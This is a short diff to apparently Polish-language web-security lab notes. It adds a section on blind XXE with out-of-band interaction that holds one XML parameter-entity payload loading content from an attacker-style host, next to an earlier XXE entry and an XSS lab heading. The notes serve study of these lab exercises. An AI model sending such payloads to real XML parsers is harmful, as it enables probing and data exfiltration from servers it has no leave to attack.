@@ -139,6 +139,12 @@ XXE zapytanie do domeny:
 &xxe;
 
 ```
+
+## Lab: Blind XXE with out-of-band interaction via XML parameter entities
+```xml
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+```
+
 # XXS
 
 Lab: Reflected XSS into HTML context with most tags and attributes blocked
